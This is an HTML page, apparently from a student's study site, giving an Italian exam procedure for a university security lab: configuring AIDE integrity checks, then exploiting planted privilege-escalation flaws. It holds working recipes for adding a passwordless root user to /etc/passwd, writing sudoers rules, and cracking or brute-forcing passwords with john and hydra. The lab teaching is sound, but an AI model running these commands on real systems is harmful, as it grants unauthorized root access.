@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="it" data-tema="scuro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>procedura_operativa_privesc.md · cockpit</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<a class="salta" href="#contenuto">Vai al contenuto</a>
+
+<header class="testata">
+  <a class="marchio" href="../index.html">cockpit</a>
+  <nav class="navigazione">
+    <a href="../index.html">Oggi</a>
+    <a href="../laurea.html">Laurea</a>
+    <a href="../corsi.html">Corsi</a>
+    <a href="../materiali.html" aria-current="page">Materiali</a>
+    <a href="../workflow.html">Workflow</a>
+    <a href="../diario.html">Diario</a>
+  </nav>
+  <div class="azioni">
+    <button type="button" class="cerca-apri" data-apri-ricerca>
+      <span>Cerca</span><kbd>Ctrl</kbd><kbd>K</kbd>
+    </button>
+    <button type="button" class="tema" data-cambia-tema aria-label="Cambia tema"></button>
+  </div>
+</header>
+
+<main id="contenuto" class="contenuto">
+<p class="metrica__etichetta">
+  archivio</p>
+<h1 class="titolo-pagina">procedura_operativa_privesc.md</h1>
+<p class="tenue"><a href="../../Vault/UniCode/ARCHIVIO/security_17-07_condensati/05_integrity_privesc/procedura_operativa_privesc.md">Apri il file originale</a></p>
+<article class="prosa"><h1 id="procedura-operativa-integrity-check-privilege-escalation">Procedura Operativa — Integrity Check &amp; Privilege Escalation</h1>
+<blockquote>
+<p>Sequenza fissa di azioni/comandi da eseguire per qualunque esercizio di questa famiglia
+(binario <code>changeN</code> o pacchetto <code>.deb</code>/<code>.deb.gz</code>/<code>.deb.gpg</code> che altera file in <code>/usr/bin</code> e
+<code>/etc</code>). Non contiene teoria — solo l'algoritmo operativo. Per il ragionamento sui vettori vedi
+<code>guida_esame_privesc.md</code>; per esempi completi già risolti, <code>modello_integrity_privesc.md</code>.</p>
+<p>⚠️ <strong>Regola d'oro: il database "pulito" va creato PRIMA di eseguire il file fornito, mai dopo.</strong>
+Se lanci <code>changeN</code>/installi il <code>.deb</code> prima di aver fatto la baseline con <code>aideinit</code>, hai perso:
+AIDE non ha più uno stato "sano" con cui confrontare. Se ti accorgi di averlo fatto, ricrea la VM
+pulita (le consegne più recenti lo dicono esplicitamente: "usare una VM mai alterata").</p>
+<p>⚠️ <strong>Seconda regola d'oro: non fermarti al primo file che AIDE segnala.</strong> Il pacchetto realistico
+introduce <strong>più modifiche insieme</strong> e quasi sempre <strong>una sola è sfruttabile</strong>; le altre sono
+vicoli ciechi (capability inutili, ACL su binari senza privilegi, falsi positivi, SGID su gruppi
+di cui non fai parte). Analizza <strong>ogni</strong> riga del diff prima di scegliere il vettore. Il criterio
+per distinguerle è al passo 6.</p>
+</blockquote>
+<h2 id="0-prima-di-toccare-qualsiasi-cosa">0. Prima di toccare qualsiasi cosa</h2>
+<ul>
+<li>[ ] <strong>Leggi tutta la consegna.</strong> Nota: (a) cosa chiede la Fase 2 esatta — <code>toor</code> senza password?
+  con password data? "diventare root e basta"? cambia i deliverable; (b) se dice "senza usare il
+  potere sudo di <code>kali</code>" (quasi sempre) — significa che devi trovare un vettore che <strong>non</strong> passi
+  per <code>sudo &lt;qualcosa&gt;</code> come <code>kali</code>; (c) i deliverable: tipicamente <code>integrity.txt</code> (Fase 1) +
+  <code>privesc.png</code> (Fase 2, uno o più: <code>privesc1.png</code>, <code>privesc2.png</code>, …).</li>
+<li>[ ] Se la consegna consiglia una "VM mai alterata", usala: alcuni esercizi assumono uno stato di
+  partenza pulito e residui di lab precedenti falsano il diff AIDE.</li>
+</ul>
+<h2 id="1-configurare-aide-col-gotcha-sullordine-e-su-usrbin">1. Configurare AIDE (col gotcha sull'ordine e su <code>/usr/bin</code>)</h2>
+<ul>
+<li>[ ] <strong>AIDE è installato?</strong> <code>which aide</code>. Se manca (e <code>/etc/aide/</code> non esiste), installalo prima:
+  <code>sudo apt install aide</code>. Su questa VM Parrot/Kali AIDE <strong>non è preinstallato di default</strong>
+  (troubleshooting_vm.md §S11). Senza, il passo 1 non parte.</li>
+</ul>
+<p>Apri il config come root:</p>
+<pre><code>sudo nano /etc/aide/aide.conf
+</code></pre>
+<ul>
+<li>[ ] <strong>Commenta l'inclusione automatica</strong> in fondo al file (rende la scansione lentissima e la
+  copertura imprevedibile):</li>
+</ul>
+<pre><code># @@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
+</code></pre>
+<ul>
+<li>[ ] <strong>Aggiungi esplicitamente le directory da monitorare.</strong> La config di default <strong>non copre
+  <code>/usr/bin</code> in modalità Full</strong> — se non lo aggiungi, le modifiche ai binari non vengono rilevate.
+  Il pacchetto tocca sempre <code>/usr/bin</code> e <code>/etc</code>:</li>
+</ul>
+<pre><code>/usr/bin  f  Full
+/etc      f  Full
+</code></pre>
+<p>⚠️ <strong>Sintassi: tre token separati da spazi, <code>&lt;percorso&gt; f Full</code>. Si scrive <code>f</code>, MAI <code>-f</code></strong>
+  (<code>/usr/bin -f Full</code> col trattino è un errore ricorrente: la riga non seleziona i file e i binari
+  non finiscono nel confronto).
+  <code>f</code> = applica la regola ai file (non alle directory come tali); <code>Full</code> = preset esteso (permessi,
+  owner/group, size, mtime/ctime, hash multipli, <strong>xattrs</strong> — indispensabile perché le capability
+  vivono nell'xattr <code>security.capability</code>). Variante equivalente vista nelle soluzioni ufficiali:
+  definire una regola custom <code>SecLabRule = p+n+u+g+s+m+c+xattrs+md5+sha512</code> e usarla
+  (<code>/usr/bin SecLabRule</code>, <code>/etc SecLabRule</code>).
+- [ ] <strong>Verifica la sintassi del config</strong> prima di procedere:</p>
+<pre><code>sudo aide -c /etc/aide/aide.conf --config-check     # oppure -C su sistema ancora pulito: 0 differenze attese
+</code></pre>
+<h2 id="2-creare-la-baseline-database-pulito">2. Creare la baseline (database "pulito")</h2>
+<pre><code>sudo aideinit
+</code></pre>
+<ul>
+<li><code>aideinit</code> crea il database <code>database_out</code> (di default <code>/var/lib/aide/aide.db.new</code>) e, <strong>solo se
+  non esiste già</strong> il <code>database_in</code> (<code>/var/lib/aide/aide.db</code>), ce lo copia identico.</li>
+<li>[ ] <strong>Verifica/forza la copia a mano</strong> — è il punto in cui più spesso il confronto poi "non
+  rileva nulla": se <code>aide.db</code> esiste già da un test precedente, <code>aideinit</code> <strong>non</strong> lo sovrascrive.</li>
+</ul>
+<pre><code>sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+</code></pre>
+<p>(Se nel config hai puntato <code>database_in</code>/<code>database_out</code> a un percorso tuo, es.
+  <code>/home/kali/aide/aide.db</code>, copia quelli: <code>cp ~/aide/aide.db{.new,}</code>.)</p>
+<h2 id="3-eseguire-il-file-fornito">3. Eseguire il file fornito</h2>
+<p>A seconda del formato:</p>
+<pre><code># binario changeN:
+chmod +x ./changeN
+sudo ./changeN
+
+# pacchetto .deb.gz:
+gunzip esame_AAAA.MM.GG_all.deb.gz
+sudo dpkg -i esame_AAAA.MM.GG_all.deb
+
+# pacchetto .deb.gpg (password tipica: &quot;esame&quot;):
+gpg -d esame_AAAA.MM.GG_all.deb.gpg &gt; e.deb
+sudo dpkg -i e.deb
+</code></pre>
+<p>Questo <code>sudo</code> è l'unico consentito: è l'"installazione" richiesta dalla consegna, non l'exploit.</p>
+<h2 id="4-confrontare-diff-aide">4. Confrontare (diff AIDE)</h2>
+<pre><code>sudo aide -C -c /etc/aide/aide.conf     # -C = Check: filesystem attuale vs database_in
+</code></pre>
+<p>(AIDE esige <code>-c &lt;config&gt;</code> anche in Check; se hai usato un config custom, <code>sudo aide -c ~/aide/aide.conf -C</code>.)</p>
+<h2 id="5-leggere-il-diff-legenda-della-riga-di-sintesi">5. Leggere il diff — legenda della riga di sintesi</h2>
+<p>Ogni entry modificata ha una riga tipo <code>f &gt;.... mc..H.. .+ : /percorso</code>. Come si legge:
+- <strong><code>f</code></strong> = file (<code>d</code> = directory).
+- Colonna 2: <code>=</code> attributo invariato, <code>&gt;</code> cresciuto (es. size aumentata → contenuto appeso),
+  <code>&lt;</code> diminuito.
+- Le lettere che seguono sono gli attributi <strong>cambiati</strong> (assenti se invariati): <code>p</code>=permessi,
+  <code>u</code>=uid/owner, <code>g</code>=gid/group, <code>s</code>=size, <code>m</code>=mtime, <code>c</code>=<strong>ctime</strong> (cambia praticamente sempre:
+  da solo non significa nulla), <code>H</code>=hash, <code>A</code>=<strong>ACL</strong>, <code>X</code>=<strong>xattrs</strong> (capability!), <code>+</code>=xattr
+  aggiunto.
+- Poi la sezione "Detailed information about changes" mostra, per ogni file, i valori
+  <strong>prima | dopo</strong>. È lì che leggi <em>cosa</em> è cambiato davvero.</p>
+<p>Segnali che contano (ignora il <code>c</code>/ctime isolato e l'<code>m</code>/mtime isolato):
+- <strong><code>X</code>/<code>+</code> su un binario di <code>/usr/bin</code></strong> → capability aggiunta → verifica con <code>getcap</code>.
+- <strong><code>A</code> (ACL)</strong> su un file → verifica con <code>getfacl</code>.
+- <strong><code>p</code> (permessi)</strong> su un binario → può essere un SUID nuovo (<code>ls -l</code>: cerca la <code>s</code>).
+- <strong><code>&gt;</code> su <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/group</code></strong> → contenuto appeso → nuovi utenti/gruppi.
+- <strong>entry <code>ADDED</code></strong> (es. un nuovo file in <code>/etc/sudoers.d/</code>) → leggilo, spesso è una regola sudo.</p>
+<h2 id="6-distinguere-il-vettore-sfruttabile-dai-vicoli-ciechi">6. Distinguere il vettore sfruttabile dai vicoli ciechi</h2>
+<p>Per <strong>ogni</strong> file segnalato, applica il comando di verifica giusto e chiediti "questo mi avvicina a
+root?". Casi reali già visti nel pool (dettagli in <code>guida_esame_privesc.md</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Cosa vedi nel diff</th>
+<th>Comando di verifica</th>
+<th>È un vicolo cieco se…</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>X</code>/<code>+</code> su binario</td>
+<td><code>getcap &lt;file&gt;</code></td>
+<td>capability vuota (falso positivo, <code>mycapfake</code>), o capability reale ma inutile (<code>cap_mknod</code>, <code>cap_audit_read</code>), o il binario non serve a scrivere file</td>
+</tr>
+<tr>
+<td><code>A</code> (ACL) su binario</td>
+<td><code>getfacl &lt;file&gt;</code></td>
+<td>l'ACL dà accesso a un binario che <strong>di suo non ha privilegi speciali</strong> (es. <code>mknod</code>, <code>chmod</code> senza CAP_FOWNER)</td>
+</tr>
+<tr>
+<td><code>p</code> = SUID nuovo</td>
+<td><code>ls -l &lt;file&gt;</code> (cerca <code>s</code>)</td>
+<td>il binario non può aprire/scrivere file utili come root (es. <code>yes</code>, <code>whoami</code>)</td>
+</tr>
+<tr>
+<td>ACL/SGID su directory</td>
+<td><code>getfacl</code> / <code>ls -ld</code></td>
+<td>SGID per un gruppo di cui <strong>non fai parte</strong></td>
+</tr>
+<tr>
+<td>solo <code>c</code> (ctime) o <code>m</code></td>
+<td>—</td>
+<td>quasi sempre rumore/ripristino: nessuna modifica sostanziale sopravvissuta</td>
+</tr>
+</tbody>
+</table>
+<p>Vettori che invece <strong>sono</strong> sfruttabili (uno di questi è quasi sempre "quello vero"):
+- <code>cap_dac_override</code> su un <strong>editor</strong> (<code>vim.tiny</code>, <code>vim.basic</code>) o su <code>tee</code> → scrive qualunque file.
+- <code>cap_fowner</code> su <code>chmod</code> → può cambiare permessi/SUID di file altrui → fabbrica un secondo vettore.
+- <strong>SUID</strong> su <code>cp</code>/<code>tee</code>/un editor → scrive file protetti come root.
+- Nuovo <strong>utente senza password</strong> in <code>/etc/passwd</code> (secondo campo vuoto) → login libero.
+- <strong>ACL di scrittura</strong> su <code>/etc/sudoers</code> o <code>/etc/passwd</code> → l'utente si auto-promuove.
+- Regola <strong>sudoers</strong> permissiva (<code>NOPASSWD</code> su un binario utile, o <strong>wildcard</strong> <code>*</code> sfruttabile).</p>
+<p>Se il vettore richiede un utente protetto da password:
+- <strong>Se puoi leggere <code>/etc/shadow</code></strong> (ACL di lettura, o un comando che te lo fa <code>cat</code> come root):
+  <code>unshadow /etc/passwd /etc/shadow &gt; f; john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt f</code>.
+- <strong>Se NON puoi leggere shadow</strong>: attacco <em>online</em> con <code>hydra -l &lt;user&gt; -P .../rockyou.txt ssh://localhost</code>.</p>
+<h2 id="7-sfruttare-il-vettore-trovato-ricette">7. Sfruttare il vettore trovato (ricette)</h2>
+<p><strong>cap_dac_override su editor (vim.tiny/vim.basic) o SUID/cap su tee</strong></p>
+<pre><code># editor: apri /etc/passwd e aggiungi/edita la riga; salva forzando (il DAC è bypassato)
+vim.tiny /etc/passwd            #  toor::0:0::/root:/bin/bash   (campo pw vuoto)  →  :w!
+# oppure via tee (cap_dac_override o SUID):
+echo &quot;toor::0:0::/root:/bin/bash&quot; | tee -a /etc/passwd
+su toor
+</code></pre>
+<p>⚠️ <strong>Con tee usa SEMPRE la pipe, mai il redirect.</strong> <code>echo "…" &gt;&gt; /etc/passwd</code> fallisce <strong>sempre</strong>
+con <em>Permission denied</em> anche se tee ha la capability/SUID: il redirect <code>&gt;&gt;</code>/<code>&gt;</code> lo apre la <strong>shell</strong>
+(coi permessi non privilegiati di <code>kali</code>), non tee. Il privilegio si attiva solo quando è il binario
+a fare la <code>open()</code>, quindi il contenuto va in <strong>pipe</strong> e il file protetto è un <strong>argomento</strong> di tee.
+Stesso motivo per cui con <code>cp</code> SUID si fa <code>cp file /etc/passwd</code> (è cp ad aprire), non <code>cat &gt; /etc/passwd</code>.</p>
+<p><strong>SUID su cp</strong> (o cap_fowner su chmod → <code>chmod u+s /usr/bin/cp</code> per crearlo)</p>
+<pre><code>cp /etc/passwd ~/p ; cat ~/p &gt; ~/passwd            # cat &gt; per una copia scrivibile dall'utente
+echo &quot;toor::0:0::/root:/bin/bash&quot; &gt;&gt; ~/passwd
+cp ~/passwd /etc/passwd                            # cp SUID scrive come root
+su toor
+</code></pre>
+<p><strong>Utente senza password + ACL su /etc/sudoers</strong></p>
+<pre><code>su intruso                                          # nessuna password
+echo 'intruso ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers   # ACL consente la scrittura
+sudo -i
+</code></pre>
+<p><strong>sudoers NOPASSWD su un binario (eventualmente dopo brute-force)</strong></p>
+<pre><code>su - spy                                            # password ottenuta con hydra/john
+sudo -l                                             # conferma cosa può fare come root
+echo &quot;toor::0:0::/root:/bin/bash&quot; | sudo /usr/bin/tee -a /etc/passwd
+su - toor
+</code></pre>
+<p><strong>Cambiare un UID a 0</strong> (quando hai un editor privilegiato e un utente-ponte senza password)</p>
+<pre><code>vim.tiny /etc/passwd            # metti a 0 l'UID di un utente passwordless (es. searcher)
+su searcher                     # ora è root
+</code></pre>
+<ul>
+<li>[ ] <strong>Prova finale sempre uguale:</strong> <code>id</code> deve dare <code>uid=0(root)</code>. È lo screenshot da catturare.</li>
+<li>Se scegli la password inline nel secondo campo di <code>/etc/passwd</code>, generala con
+  <code>openssl passwd -1 -salt &lt;salt&gt; &lt;pw&gt;</code> (MD5-crypt) o <code>openssl passwd -6 …</code> (SHA-512) e incollala
+  al posto della <code>x</code>; se lasci il campo <strong>vuoto</strong>, nessuna password sarà richiesta.</li>
+</ul>
+<h2 id="8-produrre-i-deliverable">8. Produrre i deliverable</h2>
+<ul>
+<li>[ ] <strong><code>integrity.txt</code></strong> (Fase 1, sempre richiesto): documenta <em>in modo dettagliato</em> la strategia —
+  come hai configurato AIDE (con le righe aggiunte/commentate), i comandi di baseline e confronto,
+  l'<strong>output del diff AIDE</strong> (incollalo), l'analisi file-per-file con la distinzione
+  sfruttabile/vicolo-cieco (è la parte che vale il voto: dimostra il ragionamento, non solo il
+  risultato), e la strategia di exploit. Le soluzioni ufficiali incollano l'intero output di AIDE
+  in fondo al file: fallo anche tu.</li>
+<li>[ ] <strong><code>privesc.png</code></strong> (Fase 2): screenshot dei comandi dell'exploit <strong>e</strong> dell'output finale
+  (<code>id</code> → <code>uid=0(root)</code> o il prompt <code>root@…#</code>). Se i passi sono tanti, numera più screenshot
+  (<code>privesc1.png</code>, <code>privesc2.png</code>, …) — la consegna lo consente esplicitamente.</li>
+<li>[ ] Verifica caso per caso la Fase 2 della <strong>consegna specifica</strong>: alcune chiedono un utente con
+  nome/password precisi (<code>hack</code>/<code>hack</code>, <code>toor</code>/<code>gotRoot</code>), altre solo "diventare root". Rispetta il
+  nome/la password richiesti se indicati.</li>
+</ul>
+<h2 id="9-comandi-di-scoperta-a-tappeto-se-il-diff-aide-non-basta-o-per-conferma">9. Comandi di scoperta "a tappeto" (se il diff AIDE non basta o per conferma)</h2>
+<pre><code>find / -perm /7000 2&gt;/dev/null          # tutti i file con un bit speciale (SUID 4000 / SGID 2000 / sticky 1000)
+/usr/sbin/getcap -r / 2&gt;/dev/null        # tutti i file con capability
+getfacl -sR / 2&gt;/dev/null                # tutti i file con ACL non standard
+</code></pre>
+<p>Utili per confermare che non ti sia sfuggito un vettore fuori da <code>/usr/bin</code>/<code>/etc</code>, o quando la
+consegna dice "più eventualmente altre da dedurre".</p></article>
+</main>
+
+<footer class="pieDiPagina">
+  <p>Generato il 2026-09-02 16:48 da <code>scripts/build_ui.py</code>. Sola lettura.</p>
+</footer>
+
+<dialog class="ricerca" id="ricerca">
+  <input type="search" id="ricerca-campo" placeholder="Cerca in tutto il cockpit…" autocomplete="off">
+  <ul id="ricerca-esiti"></ul>
+</dialog>
+
+<script>window.RADICE = "../";</script>
+<script src="../assets/indice.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
